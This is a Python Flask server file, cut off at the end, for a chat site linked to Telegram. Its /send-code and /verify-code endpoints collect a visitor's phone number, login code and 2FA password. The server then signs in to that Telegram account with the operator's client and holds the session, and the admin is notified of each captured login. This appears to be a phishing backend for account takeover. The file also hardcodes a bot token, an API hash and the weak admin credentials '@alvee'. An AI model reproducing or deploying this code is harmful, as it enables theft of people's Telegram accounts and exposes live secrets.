import os
import re
import uuid
import time
import json
import asyncio
import random
import sqlite3
import threading
import traceback
import mimetypes
import hashlib
import hmac
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path
from typing import Optional, Tuple

import requests
from flask import Flask, request, jsonify, send_file, abort, session, redirect, url_for, render_template_string
from flask_cors import CORS
from werkzeug.utils import secure_filename
from werkzeug.exceptions import RequestEntityTooLarge

try:
    from pyrogram import Client, filters
    from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto, InputMediaVideo
except ImportError:
    Client = None
    filters = None
    InlineKeyboardMarkup = None
    InlineKeyboardButton = None
    InputMediaPhoto = None
    InputMediaVideo = None


# ============================================================
# Configuration — Credentials integrated directly
# ============================================================

BASE_DIR = Path(__file__).resolve().parent

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE").strip()
API_ID = int(os.environ.get("API_ID", "32875278") or "32875278")
API_HASH = os.environ.get("API_HASH", "55d7b29aa48e8e160abe9e3cb91ba347").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6034439625") or "6034439625")

# টেলিগ্রাম চ্যানেল আইডি সঠিক ফরম্যাটে সেট করা হলো
_raw_channel_id = os.environ.get("STORAGE_CHANNEL_ID", "-1004322205565").strip()
if not _raw_channel_id.startswith("-"):
    if _raw_channel_id.startswith("100"):
        STORAGE_CHANNEL_ID = int(f"-{_raw_channel_id}")
    else:
        STORAGE_CHANNEL_ID = int(f"-{_raw_channel_id}")
else:
    STORAGE_CHANNEL_ID = int(_raw_channel_id)

WEBHOOK_SECRET = os.environ.get("TELEGRAM_WEBHOOK_SECRET", "my_secure_webhook_secret_123").strip()

MAX_UPLOAD_MB = max(1, int(os.environ.get("MAX_UPLOAD_MB", "50")))
MAX_CHAT_TEXT_CHARS = 3000
CHAT_HISTORY_LIMIT_DEFAULT = 100
CHAT_BACKUP_MARKER = "[CHAT_BACKUP]"
CHAT_BACKUP_TEXT_MARKER = "[CHAT_BACKUP_TEXT]"

DB_PATH = Path(os.environ.get("CHAT_DB_PATH", str(BASE_DIR / "chat_messages.db")))
MEDIA_DIR = Path(os.environ.get("CHAT_MEDIA_DIR", str(BASE_DIR / "static" / "chat_media")))
BG_DIR = Path(os.environ.get("BACKGROUND_DIR", str(BASE_DIR / "static" / "backgrounds")))

MEDIA_DIR.mkdir(parents=True, exist_ok=True)
BG_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH.parent.mkdir(parents=True, exist_ok=True)

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "alvee_super_secret_key_12345")
app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_MB * 1024 * 1024
CORS(app)

active_clients = {}
admin_states = {}
total_logged_in_users = 0

pyrogram_client = None
pyrogram_loop = asyncio.new_event_loop()
pyrogram_loop_ready = threading.Event()
pyrogram_thread = threading.Thread(
    target=lambda: _run_pyrogram_loop(),
    name="pyrogram-background-loop",
    daemon=True,
)

# সাময়িকভাবে ইউজারের আপলোড করা ফাইল (ফটো এবং ভিডিও) স্টোর করার মেমোরি
pending_uploads = {}


# ============================================================
# SQLite chat storage
# ============================================================

def db_connect():
    conn = sqlite3.connect(str(DB_PATH), timeout=30)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with db_connect() as conn:
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("""
            CREATE TABLE IF NOT EXISTS chat_messages (
                id TEXT PRIMARY KEY,
                client_message_id TEXT UNIQUE,
                client_id TEXT NOT NULL,
                sender_name TEXT NOT NULL,
                text TEXT NOT NULL DEFAULT '',
                media_filename TEXT,
                media_type TEXT,
                telegram_file_id TEXT,
                telegram_message_id INTEGER,
                telegram_chat_id TEXT,
                telegram_saved INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL
            )
        """)
        conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_chat_created_at
            ON chat_messages(created_at)
        """)
        conn.commit()


def row_to_message(row):
    if row is None:
        return None

    has_media = bool(row["media_filename"] or row["telegram_file_id"])

    return {
        "id": row["id"],
        "client_message_id": row["client_message_id"],
        "client_id": row["client_id"],
        "sender_name": row["sender_name"],
        "text": row["text"] or "",
        "media_url": f"/api/chat/media/{row['id']}" if has_media else "",
        "media_type": row["media_type"] or "",
        "created_at": row["created_at"],
        "telegram_saved": bool(row["telegram_saved"]),
    }


def get_message_by_id(message_id):
    with db_connect() as conn:
        row = conn.execute(
            "SELECT * FROM chat_messages WHERE id = ?",
            (message_id,)
        ).fetchone()
    return row


def get_chat_stats():
    with db_connect() as conn:
        total_messages = conn.execute(
            "SELECT COUNT(*) FROM chat_messages"
        ).fetchone()[0]
        total_clients = conn.execute(
            "SELECT COUNT(DISTINCT client_id) FROM chat_messages"
        ).fetchone()[0]
    return {
        "total_chat_messages": int(total_messages or 0),
        "total_chat_clients": int(total_clients or 0),
    }


init_db()


# ============================================================
# Telegram Bot API helpers
# ============================================================

class TelegramAPIError(RuntimeError):
    pass


class TelegramNotConfiguredError(RuntimeError):
    pass


def telegram_api(method, data=None, files=None, timeout=(10, 120)):
    if not BOT_TOKEN:
        raise TelegramNotConfiguredError(
            "BOT_TOKEN is not configured in the server environment."
        )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"

    try:
        response = requests.post(
            url,
            data=data or {},
            files=files,
            timeout=timeout,
        )
        try:
            payload = response.json()
        except ValueError:
            payload = {}

        if response.status_code >= 400 or not payload.get("ok"):
            description = payload.get("description") or (
                f"Telegram API returned HTTP {response.status_code}"
            )
            raise TelegramAPIError(description)

        return payload.get("result", {})

    except requests.RequestException as exc:
        raise TelegramAPIError(f"Telegram network error: {exc}") from exc


def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
    try:
        payload = {"chat_id": str(chat_id), "text": str(text)}
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        if parse_mode:
            payload["parse_mode"] = parse_mode
        telegram_api("sendMessage", data=payload, timeout=(10, 30))
        return True
    except Exception as exc:
        print("Telegram sendMessage error:", exc)
        return False


def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode=None):
    try:
        payload = {
            "chat_id": str(chat_id),
            "message_id": int(message_id),
            "text": str(text),
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        if parse_mode:
            payload["parse_mode"] = parse_mode
        telegram_api("editMessageText", data=payload, timeout=(10, 30))
        return True
    except Exception as exc:
        print("Telegram editMessageText error:", exc)
        return False


def answer_callback(callback_query_id, text, show_alert=False):
    try:
        telegram_api(
            "answerCallbackQuery",
            data={
                "callback_query_id": callback_query_id,
                "text": str(text),
                "show_alert": bool(show_alert),
            },
            timeout=(5, 15),
        )
    except Exception as exc:
        print("Telegram callback answer error:", exc)


def get_telegram_file_id(result):
    if not isinstance(result, dict):
        return None

    if result.get("photo"):
        photos = result["photo"]
        if photos:
            return photos[-1].get("file_id")

    for key in ("video", "document", "animation"):
        item = result.get(key)
        if isinstance(item, dict):
            return item.get("file_id")

    return None


def send_chat_archive_to_telegram(
    message_id: str,
    sender_name: str,
    text: str,
    created_at: str,
    client_id: str,
    media_path: Optional[Path],
    media_type: str,
    original_filename: str,
) -> Tuple[Optional[int], Optional[str], bool]:
    header = (
        f"{CHAT_BACKUP_MARKER}\n"
        f"ID: {message_id}\n"
        f"Sender: {sender_name}\n"
        f"Time: {created_at}\n"
    )

    if not media_path:
        archive_text = header + "\n" + (text or "(No text)")
        result = telegram_api(
            "sendMessage",
            data={
                "chat_id": str(STORAGE_CHANNEL_ID),
                "text": archive_text,
                "disable_web_page_preview": "true",
            },
        )
        return result.get("message_id"), None, True

    caption_limit = 950
    available_text = max(0, caption_limit - len(header) - 2)
    caption_text = (text or "")[:available_text]
    caption = header + (("\n" + caption_text) if caption_text else "")

    mime = (media_type or "").lower()
    if mime.startswith("video/"):
        method = "sendVideo"
        upload_field = "video"
    elif mime in ("image/jpeg", "image/png"):
        method = "sendPhoto"
        upload_field = "photo"
    else:
        method = "sendDocument"
        upload_field = "document"

    with open(media_path, "rb") as file_handle:
        result = telegram_api(
            method,
            data={
                "chat_id": str(STORAGE_CHANNEL_ID),
                "caption": caption,
            },
            files={
                upload_field: (
                    original_filename or media_path.name,
                    file_handle,
                    mime or "application/octet-stream",
                )
            },
        )

    telegram_message_id = result.get("message_id")
    telegram_file_id = get_telegram_file_id(result)
    backup_complete = True

    if len(text or "") > len(caption_text):
        full_text = (
            f"{CHAT_BACKUP_TEXT_MARKER}\n"
            f"ID: {message_id}\n"
            f"Full message text:\n{text}"
        )
        try:
            telegram_api(
                "sendMessage",
                data={
                    "chat_id": str(STORAGE_CHANNEL_ID),
                    "text": full_text,
                    "disable_web_page_preview": "true",
                },
            )
        except Exception as exc:
            backup_complete = False
            print("Telegram full-text backup error:", exc)

    return telegram_message_id, telegram_file_id, backup_complete


def download_telegram_file(file_id):
    if not BOT_TOKEN or not file_id:
        return None, None

    try:
        response = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
            params={"file_id": file_id},
            timeout=30,
        )
        payload = response.json()
        if not response.ok or not payload.get("ok"):
            print("Telegram getFile error:", payload)
            return None, None

        file_path = payload["result"]["file_path"]
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        file_response = requests.get(download_url, timeout=60)

        if not file_response.ok:
            return None, None

        return file_response.content, file_path

    except Exception as exc:
        print("Telegram file download error:", exc)
        return None, None


# ============================================================
# Telegram Login / User Verification Endpoints
# ============================================================

temp_client_sessions = {}

@app.route("/send-code", methods=["POST"])
def send_code_api():
    req_data = request.get_json(silent=True) or {}
    phone = req_data.get("phone", "").strip()
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required."}), 400

    if Client is None:
        return jsonify({"status": "error", "message": "Pyrogram is not installed on server."}), 500

    async def async_send():
        try:
            client = Client(
                f"session_{uuid.uuid4().hex[:8]}",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True
            )
            await client.connect()
            sent = await client.send_code(phone)
            phone_code_hash = sent.phone_code_hash
            temp_client_sessions[phone] = client
            return {"status": "success", "phone_code_hash": phone_code_hash}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    try:
        res = run_async(async_send(), timeout=30)
        return jsonify(res)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/verify-code", methods=["POST"])
def verify_code_api():
    req_data = request.get_json(silent=True) or {}
    phone = req_data.get("phone", "").strip()
    code = req_data.get("code", "").strip()
    phone_code_hash = req_data.get("phone_code_hash", "").strip()
    password = req_data.get("password", "").strip()

    if not phone or not phone_code_hash:
        return jsonify({"status": "error", "message": "Missing phone or hash."}), 400

    client = temp_client_sessions.get(phone)
    if not client:
        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400

    async def async_verify():
        try:
            if password:
                await client.check_password(password)
            else:
                await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            
            global total_logged_in_users
            total_logged_in_users += 1
            send_telegram_message(ADMIN_ID, f"🎉 New Successful Telegram Login!\n📱 Phone: {phone}")
            
            return {"status": "success"}
        except Exception as e:
            err_str = str(e).lower()
            if "password" in err_str or "sessionpasswordneeded" in err_str:
                return {"status": "2fa_required", "message": "2FA password required."}
            return {"status": "error", "message": str(e)}

    try:
        res = run_async(async_verify(), timeout=30)
        return jsonify(res)
    except Exception as e:
        err_message = str(e)
        err_lower = err_message.lower()
        if "password" in err_lower or "sessionpasswordneeded" in err_lower:
            return jsonify({"status": "2fa_required", "message": "2FA password required."})
        return jsonify({"status": "error", "message": err_message}), 500


# ============================================================
# Secure Telegram Profile API
# ============================================================

@app.route("/auth/telegram", methods=["POST"])
def telegram_login_auth():
    payload = request.get_json(silent=True) or {}
    received_hash = str(payload.pop("hash", "")).strip()
    bot_token = os.environ.get("BOT_TOKEN", "").strip()

    if not bot_token or not received_hash:
        return jsonify({
            "status": "error",
            "message": "Telegram authentication is not configured."
        }), 400

    try:
        auth_date = int(payload.get("auth_date", 0))
        telegram_id = int(payload.get("id", 0))
    except (TypeError, ValueError):
        return jsonify({
            "status": "error",
            "message": "Invalid Telegram login data."
        }), 400

    now = int(time.time())

    if telegram_id <= 0 or auth_date <= 0:
        return jsonify({
            "status": "error",
            "message": "Missing Telegram user ID or login time."
        }), 400

    if auth_date > now + 60 or now - auth_date > 86400:
        return jsonify({
            "status": "error",
            "message": "Telegram login data has expired."
        }), 401

    data_check_string = "\n".join(
        f"{key}={payload[key]}"
        for key in sorted(payload)
    )

    secret_key = hashlib.sha256(
        bot_token.encode("utf-8")
    ).digest()

    expected_hash = hmac.new(
        secret_key,
        data_check_string.encode("utf-8"),
        hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(received_hash, expected_hash):
        return jsonify({
            "status": "error",
            "message": "Telegram authentication failed."
        }), 401

    first_name = str(payload.get("first_name", "")).strip()
    last_name = str(payload.get("last_name", "")).strip()
    username = str(payload.get("username", "")).strip()
    photo = str(payload.get("photo_url", "")).strip()

    if not photo.startswith("https://"):
        photo = ""

    session["telegram_profile"] = {
        "id": telegram_id,
        "name": " ".join(
            part for part in (first_name, last_name) if part
        ) or "Telegram User",
        "username": username,
        "photo": photo,
        "phone": "",
        "bio": ""
    }
    session["telegram_auth_date"] = auth_date

    return jsonify({"status": "success"})


@app.route("/get-user-profile", methods=["POST"])
def get_user_profile_api():
    profile = session.get("telegram_profile")
    auth_date = session.get("telegram_auth_date", 0)

    if not isinstance(profile, dict):
        return jsonify({
            "status": "error",
            "message": "Please sign in using Telegram Login."
        }), 401

    try:
        if int(time.time()) - int(auth_date) > 86400:
            session.pop("telegram_profile", None)
            session.pop("telegram_auth_date", None)

            return jsonify({
                "status": "error",
                "message": "Your login has expired. Please sign in again."
            }), 401
    except (TypeError, ValueError):
        return jsonify({
            "status": "error",
            "message": "Invalid login session."
        }), 401

    return jsonify({
        "status": "success",
        "profile": {
            "id": profile.get("id"),
            "name": profile.get("name", ""),
            "username": profile.get("username", ""),
            "phone": profile.get("phone", ""),
            "bio": profile.get("bio", ""),
            "photo": profile.get("photo", "")
        }
    })


# ============================================================
# Telegram Channel Posts API (For OC Collection Universe)
# ============================================================

@app.route("/api/channel/posts", methods=["GET"])
@app.route("/api/get_videos", methods=["GET"]) # oc-channel.js এর জন্য এন্ডপয়েন্ট
def get_channel_posts_api():
    if pyrogram_client is None:
        return jsonify({
            "status": "error",
            "error": "Pyrogram client is not running or channel sync is disabled."
        }), 503

    async def fetch_posts():
        posts = []
        video_urls = []
        try:
            # সর্বশেষ ৫০টি মেসেজ চেক করবে
            async for message in pyrogram_client.get_chat_history(STORAGE_CHANNEL_ID, limit=50):
                if is_chat_backup_message(message):
                    continue

                media_type = "text"
                if message.photo:
                    media_type = "photo"
                elif message.video:
                    media_type = "video"
                    video_urls.append(f"/api/channel/media/{message.id}")
                elif message.animation:
                    media_type = "animation"
                    video_urls.append(f"/api/channel/media/{message.id}")
                elif message.document:
                    mime = (getattr(message.document, "mime_type", None) or "").lower()
                    if mime.startswith("image/"):
                        media_type = "photo"
                    elif mime.startswith("video/"):
                        media_type = "video"
                        video_urls.append(f"/api/channel/media/{message.id}")
                    else:
                        media_type = "document"

                posts.append({
                    "id": message.id,
                    "text": message.caption or message.text or "",
                    "media_type": media_type,
                    "media_url": f"/api/channel/media/{message.id}" if media_type in ["photo", "video", "animation"] else None,
                    "date": message.date.isoformat() if message.date else "",
                    "has_media": message_is_background_media(message)
                })
            return posts, video_urls
        except Exception:
            print("Error fetching channel posts:", traceback.format_exc())
            return [], []

    try:
        posts, video_urls = run_async(fetch_posts(), timeout=30)
        # JavaScript API এর জন্য success এবং videos ফিল্ড অ্যাড করা হলো
        return jsonify({"ok": True, "status": "success", "posts": posts, "videos": video_urls})
    except Exception as exc:
        return jsonify({"ok": False, "status": "error", "error": str(exc)}), 500


@app.route("/api/channel/media/<int:message_id>", methods=["GET"])
def get_channel_media(message_id):
    if pyrogram_client is None:
        return jsonify({"ok": False, "error": "Pyrogram client is not running."}), 503

    async def fetch_media():
        try:
            message = await pyrogram_client.get_messages(STORAGE_CHANNEL_ID, message_id)
            if not message:
                return None, None, "Message not found"
            
            file_bytes = await pyrogram_client.download_media(message, in_memory=True)
            if not file_bytes:
                return None, None, "Media could not be downloaded"
            
            mime = "application/octet-stream"
            if message.photo:
                mime = "image/jpeg"
            elif message.video:
                mime = message.video.mime_type or "video/mp4"
            elif message.document:
                mime = message.document.mime_type or "application/octet-stream"
            elif message.animation:
                mime = "video/mp4"

            return file_bytes.getbuffer(), mime, None
        except Exception as e:
            return None, None, str(e)

    try:
        content, mimetype, err = run_async(fetch_media(), timeout=60)
        if err or not content:
            return jsonify({"ok": False, "error": err or "Media not found"}), 404
        
        return send_file(BytesIO(content), mimetype=mimetype, as_attachment=False)
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500


# ============================================================
# Admin Panel Routes
# ============================================================

ADMIN_USER = "@alvee"
ADMIN_PASS = "@alvee"

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; margin: 20px; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); box-sizing: border-box; }
        h1 { color: #38bdf8; text-align: center; font-size: 22px; }
        .stats-box { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-card { background: #334155; padding: 15px; border-radius: 8px; text-align: center; width: 45%; }
        .stat-card h3 { margin: 0 0 8px; color: #cbd5e1; font-size: 14px; }
        .stat-card p { font-size: 20px; margin: 0; color: #38bdf8; font-weight: bold; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #cbd5e1; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #fff; box-sizing: border-box; font-size: 16px; }
        button { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
        button:hover { background: #0369a1; }
        .logout { text-align: right; margin-bottom: 15px; }
        .logout a { color: #f43f5e; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        {% if logged_in %}
            <div class="logout"><a href="/admin/logout">Logout 🚪</a></div>
            <h1>⚡ Website Admin Dashboard</h1>
            <div class="stats-box">
                <div class="stat-card">
                    <h3>Total Chat Messages</h3>
                    <p>{{ stats.total_chat_messages }}</p>
                </div>
                <div class="stat-card">
                    <h3>Logged-in Users</h3>
                    <p>{{ stats.total_chat_clients }}</p>
                </div>
            </div>
            <hr style="border-color: #334155; margin: 20px 0;">
            <h3>System Info</h3>
            <p><strong>Bot Status:</strong> Active ✅</p>
            <p><strong>Storage Channel:</strong> Connected ✅</p>
        {% else %}
            <h1>🔒 Admin Login</h1>
            {% if error %}<p style="color: #f43f5e; text-align: center;">{{ error }}</p>{% endif %}
            <form method="POST" action="/admin">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit">Login</button>
            </form>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/admin", methods=["GET", "POST"])
def admin_panel():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        if username == ADMIN_USER and password == ADMIN_PASS:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            error = "Invalid username or password!"

    logged_in = session.get("admin_logged_in", False)
    stats = get_chat_stats() if logged_in else {}
    return render_template_string(ADMIN_TEMPLATE, logged_in=logged_in, stats=stats, error=error)


@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_panel"))


# ============================================================
# Chat API
# ============================================================

@app.route("/api/chat/messages", methods=["GET", "POST"])
def chat_messages_api():
    if request.method == "GET":
        try:
            limit = request.args.get("limit", CHAT_HISTORY_LIMIT_DEFAULT, type=int)
            limit = max(1, min(limit or CHAT_HISTORY_LIMIT_DEFAULT, 200))

            with db_connect() as conn:
                rows = conn.execute(
                    "SELECT * FROM chat_messages "
                    "ORDER BY created_at DESC LIMIT ?",
                    (limit,),
                ).fetchall()

            messages = [row_to_message(row) for row in reversed(rows)]
            return jsonify({"ok": True, "messages": messages})

        except Exception:
            print("Chat history error:", traceback.format_exc())
            return jsonify({"ok": False, "error": "Unable to load chat history."}), 500

    text = (request.form.get("text") or "").strip()
    client_id = (request.form.get("client_id") or "").strip()[:120]
    client_message_id = (
        request.form.get("client_message_id") or uuid.uuid4().hex
    ).strip()[:120]

    sender_name = "Anonymous User"

    if not client_id:
        client_id = uuid.uuid4().hex

    if len(text) > MAX_CHAT_TEXT_CHARS:
        return jsonify({
            "ok": False,
            "error": f"Message text must be {MAX_CHAT_TEXT_CHARS} characters or fewer.",
        }), 400

    uploaded_file = request.files.get("media")
    if not text and (uploaded_file is None or not uploaded_file.filename):
        return jsonify({"ok": False, "error": "Write a message or attach a file."}), 400

    if not BOT_TOKEN:
        return jsonify({
            "ok": False,
            "error": "Chat storage is not configured. Set BOT_TOKEN on the server.",
        }), 503

    with db_connect() as conn:
        existing = conn.execute(
            "SELECT * FROM chat_messages WHERE client_message_id = ?",
            (client_message_id,),
        ).fetchone()

    if existing:
        message = row_to_message(existing)
        return jsonify({
            "ok": True,
            "message": message,
            "telegram_saved": bool(existing["telegram_saved"]),
            "duplicate": True,
        })

    message_id = uuid.uuid4().hex
    created_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
    media_filename = None
    media_type = ""
    original_filename = ""
    media_path = None

    if uploaded_file and uploaded_file.filename:
        original_filename = secure_filename(uploaded_file.filename) or "upload"
        media_type = (
            uploaded_file.mimetype
            or mimetypes.guess_type(original_filename)[0]
            or ""
        ).lower()

        if not (media_type.startswith("image/") or media_type.startswith("video/")):
            return jsonify({
                "ok": False,
                "error": "Only image and video uploads are allowed.",
            }), 400

        suffix = Path(original_filename).suffix[:12]
        media_filename = f"{message_id}{suffix}"
        media_path = MEDIA_DIR / media_filename

        try:
            uploaded_file.save(media_path)
        except Exception:
            print("Media save error:", traceback.format_exc())
            return jsonify({"ok": False, "error": "Unable to save uploaded media."}), 500

    try:
        telegram_message_id, telegram_file_id, telegram_saved = (
            send_chat_archive_to_telegram(
                message_id=message_id,
                sender_name=sender_name,
                text=text,
                created_at=created_at,
                client_id=client_id,
                media_path=media_path,
                media_type=media_type,
                original_filename=original_filename,
            )
        )

        with db_connect() as conn:
            conn.execute(
                """
                INSERT INTO chat_messages (
                    id, client_message_id, client_id, sender_name, text,
                    media_filename, media_type, telegram_file_id,
                    telegram_message_id, telegram_chat_id, telegram_saved,
                    created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    message_id,
                    client_message_id,
                    client_id,
                    sender_name,
                    text,
                    media_filename,
                    media_type,
                    telegram_file_id,
                    telegram_message_id,
                    str(STORAGE_CHANNEL_ID),
                    1 if telegram_saved else 0,
                    created_at,
                ),
            )
            conn.commit()

        row = get_message_by_id(message_id)

        return jsonify({
            "ok": True,
            "message": row_to_message(row),
            "telegram_saved": bool(telegram_saved),
        }), 201

    except TelegramNotConfiguredError as exc:
        if media_path and media_path.exists():
            media_path.unlink(missing_ok=True)
        return jsonify({"ok": False, "error": str(exc)}), 503

    except TelegramAPIError as exc:
        if media_path and media_path.exists():
            media_path.unlink(missing_ok=True)
        print("Telegram chat backup failed:", exc)
        return jsonify({
            "ok": False,
            "error": "Telegram storage failed. Please try again.",
        }), 502

    except sqlite3.IntegrityError:
        with db_connect() as conn:
            row = conn.execute(
                "SELECT * FROM chat_messages WHERE client_message_id = ?",
                (client_message_id,),
            ).fetchone()
        if row:
            return jsonify({
                "ok": True,
                "message": row_to_message(row),
                "telegram_saved": bool(row["telegram_saved"]),
                "duplicate": True,
            })
        print("Chat database integrity error:", traceback.format_exc())
        return jsonify({"ok": False, "error": "Unable to save chat message."}), 500

    except Exception:
        print("Chat send error:", traceback.format_exc())
        return jsonify({
            "ok": False,
            "error": "Unexpected server error while saving the message.",
        }), 500


@app.route("/api/chat/media/<message_id>", methods=["GET"])
def get_chat_media(message_id):
    row = get_message_by_id(message_id)
    if row is None:
        return jsonify({"ok": False, "error": "Media not found."}), 404

    media_type = row["media_type"] or "application/octet-stream"
    media_filename = row["media_filename"]

    if media_filename:
        local_path = MEDIA_DIR / os.path.basename(media_filename)
        if local_path.is_file():
            return send_file(
                local_path,
                mimetype=media_type,
                conditional=True,
                as_attachment=False,
            )

    file_id = row["telegram_file_id"]
    content, telegram_path = download_telegram_file(file_id)

    if content is None:
        return jsonify({
            "ok": False,
            "error": "Media is not available on this server.",
        }), 404

    guessed_type = mimetypes.guess_type(telegram_path or "")[0] or media_type
    filename = Path(telegram_path or "media").name

    return send_file(
        BytesIO(content),
        mimetype=guessed_type,
        download_name=filename,
        as_attachment=False,
    )


@app.route("/stats", methods=["GET"])
def get_stats():
    stats = get_chat_stats()
    return jsonify({
        "total_users_logged_in": total_logged_in_users,
        **stats,
    })


@app.errorhandler(RequestEntityTooLarge)
def handle_large_upload(_error):
    return jsonify({
        "ok": False,
        "error": f"Upload is too large. Maximum upload size is {MAX_UPLOAD_MB} MB.",
    }), 413


# ============================================================
# Website pages and background media
# ============================================================

@app.route("/", methods=["GET"])
def home():
    index_path = BASE_DIR / "index.html"
    if index_path.is_file():
        return send_file(index_path)
    return "index.html not found", 404


@app.route("/naughty.html", methods=["GET"])
def naughty_page():
    page_path = BASE_DIR / "naughty.html"
    if page_path.is_file():
        return send_file(page_path)
    return "naughty.html not found", 404


@app.route("/verify.html", methods=["GET"])
def verify_page():
    page_path = BASE_DIR / "verify.html"
    if page_path.is_file():
        return send_file(page_path)
    return "verify.html not found", 404


@app.route("/dashboard.html", methods=["GET"])
def dashboard_page():
    page_path = BASE_DIR / "dashboard.html"
    if page_path.is_file():
        return send_file(page_path)
    return "dashboard.html not found", 404


def background_file_type(filename):
    ext = Path(filename).suffix.lower()
    if ext in {".mp4", ".mov", ".webm", ".mkv", ".m4v"}:
        return "video"
    if ext in {".jpg", ".jpeg", ".png", ".webp", ".gif"}:
        return "image"
    return None


@app.route("/get-random-background", methods=["GET"])
def get_random_background():
    BG_DIR.mkdir(parents=True, exist_ok=True)

    files = [
        name for name in os.listdir(BG_DIR)
        if (BG_DIR / name).is_file() and background_file_type(name)
    ]

    blur_val = app.config.get("CURRENT_BLUR", "3px")

    if not files:
        return jsonify({
            "status": "success",
            "url": "https://carder.top/imagens/1792298157180-542085424.jpg",
            "type": "image",
            "blur": blur_val,
        })

    chosen_file = random.choice(files)
    return jsonify({
        "status": "success",
        "url": f"/static/backgrounds/{chosen_file}?v={int(time.time())}",
        "type": background_file_type(chosen_file),
        "blur": blur_val,
    })


def download_background_file_by_id(file_id, file_name_prefix):
    if not BOT_TOKEN or not file_id:
        return False, None

    try:
        response = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
            params={"file_id": file_id},
            timeout=30,
        )
        payload = response.json()

        if not response.ok or not payload.get("ok"):
            print("Background getFile error:", payload)
            return False, None

        telegram_path = payload["result"]["file_path"]
        ext = Path(telegram_path).suffix.lower()

        if ext not in {
            ".mp4", ".mov", ".webm", ".mkv", ".m4v",
            ".jpg", ".jpeg", ".png", ".webp", ".gif",
        }:
            ext = ".mp4"

        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{telegram_path}"
        file_response = requests.get(download_url, stream=True, timeout=120)

        if file_response.status_code != 200:
            return False, None

        prefix = secure_filename(file_name_prefix) or "background"
        unique_name = f"{prefix}_{int(time.time())}_{random.randint(1000,9999)}{ext}"
        save_path = BG_DIR / unique_name

        with open(save_path, "wb") as output:
            for chunk in file_response.iter_content(chunk_size=32768):
                if chunk:
                    output.write(chunk)

        return True, unique_name

    except Exception:
        print("Background download error:", traceback.format_exc())
        return False, None

# ============================================================
# Added Route for oc-channel.js
# ============================================================
@app.route("/oc-channel.js", methods=["GET"])
def oc_channel_script():
    page_path = BASE_DIR / "oc-channel.js"
    if page_path.is_file():
        return send_file(page_path, mimetype="text/javascript")
    return "oc-channel.js not found", 404

# ============================================================
# Pyrogram channel monitor & Bot Uploader
# ============================================================

def _run_pyrogram_loop():
    asyncio.set_event_loop(pyrogram_loop)
    pyrogram_loop_ready.set()
    pyrogram_loop.run_forever()


def run_async(coro, timeout=180):
    if not pyrogram_thread.is_alive():
        raise RuntimeError("Pyrogram background loop is not running.")
    if not pyrogram_loop_ready.wait(timeout=5):
        raise RuntimeError("Pyrogram background loop did not start.")
    future = asyncio.run_coroutine_threadsafe(coro, pyrogram_loop)
    return future.result(timeout=timeout)


def is_chat_backup_message(message):
    content = (getattr(message, "caption", None) or getattr(message, "text", None) or "").strip()
    return (
        content.startswith(CHAT_BACKUP_MARKER)
        or content.startswith(CHAT_BACKUP_TEXT_MARKER)
    )


def message_is_background_media(message):
    if getattr(message, "photo", None):
        return True
    if getattr(message, "video", None):
        return True
    if getattr(message, "animation", None):
        return True

    document = getattr(message, "document", None)
    if document:
        mime = (getattr(document, "mime_type", None) or "").lower()
        return mime.startswith("image/") or mime.startswith("video/")

    return False


async def download_background_message(client, message, prefix="channel"):
